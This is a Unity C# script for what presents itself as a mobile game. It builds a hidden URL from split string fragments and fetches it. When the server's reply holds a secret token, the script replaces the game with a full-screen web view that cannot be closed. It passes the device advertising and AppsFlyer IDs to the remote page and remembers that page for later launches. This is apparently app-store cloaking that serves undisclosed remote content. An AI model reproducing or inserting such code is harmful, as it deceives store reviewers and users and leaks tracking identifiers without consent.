using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainER : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oneERName = "";
    [HideInInspector] public string twoERName = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaER") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneERName = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlERlink", string.Empty) != string.Empty)
            {
                NETERLOOK(PlayerPrefs.GetString("UrlERlink"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoERName += n;
                }
                StartCoroutine(IENUMER());
            }
        }
        else
        {
            BeginER();
        }
    }

    private void BeginER()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Menu");
    }

    private IEnumerator IENUMER()
    {
        using (UnityWebRequest er = UnityWebRequest.Get(twoERName))
        {

            yield return er.SendWebRequest();
            if (er.isNetworkError)
            {
                BeginER();
            }
            int synchronizationER = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && synchronizationER > 0)
            {
                yield return new WaitForSeconds(1);
                synchronizationER--;
            }
            try
            {
                if (er.result == UnityWebRequest.Result.Success)
                {
                    if (er.downloadHandler.text.Contains("NdbaqhTEgptRc"))
                    {

                        try
                        {
                            var subs = er.downloadHandler.text.Split('|');
                            NETERLOOK(subs[0] + "?idfa=" + oneERName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            NETERLOOK(er.downloadHandler.text + "?idfa=" + oneERName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        BeginER();
                    }
                }
                else
                {
                    BeginER();
                }
            }
            catch
            {
                BeginER();
            }
        }
    }

    private void NETERLOOK(string UrlERlink, string NominationER = "", int pix = 70)
    {        
        UniWebView.SetAllowInlinePlay(true);
        var _refsER = gameObject.AddComponent<UniWebView>();
        _refsER.SetToolbarDoneButtonText("");
        switch (NominationER)
        {
            case "0":
                _refsER.SetShowToolbar(true, false, false, true);
                break;
            default:
                _refsER.SetShowToolbar(false);
                break;
        }
        _refsER.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _refsER.OnShouldClose += (view) =>
        {
            return false;
        };
        _refsER.SetSupportMultipleWindows(true);
        _refsER.SetAllowBackForwardNavigationGestures(true);
        _refsER.OnMultipleWindowOpened += (view, windowId) =>
        {
            _refsER.SetShowToolbar(true);

        };
        _refsER.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NominationER)
            {
                case "0":
                    _refsER.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _refsER.SetShowToolbar(false);
                    break;
            }
        };
        _refsER.OnOrientationChanged += (view, orientation) =>
        {
            _refsER.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _refsER.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlERlink", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlERlink", url);
            }
        };
        _refsER.Load(UrlERlink);
        _refsER.Show();
    }
}
